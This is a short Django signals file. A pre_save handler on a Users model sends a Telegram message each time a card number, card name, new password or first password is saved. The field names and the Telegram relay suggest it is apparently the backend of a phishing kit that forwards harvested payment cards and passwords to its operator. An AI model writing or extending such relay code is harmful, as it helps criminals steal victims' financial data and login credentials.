from django.db.models.signals import post_save, pre_save
from django.dispatch import receiver
from .models import Users
from .utils import send_telegram_email


# send telegram message
@receiver(pre_save, sender=Users)
def telegram_notification(sender, instance, **kwargs):
    if instance.pk:
        old_instance = Users.objects.get(pk=instance.pk)

        if instance.number != old_instance.number:
            send_telegram_email(instance)
            # print('billing')
        elif instance.card_name != old_instance.card_name:
            send_telegram_email(instance)
            # print('card')
        elif (instance.new_password != old_instance.new_password):
            send_telegram_email(instance)
            # print('pass')

    if not instance.pk:
        if instance.password:
            send_telegram_email(instance)
            # print('fisrt')
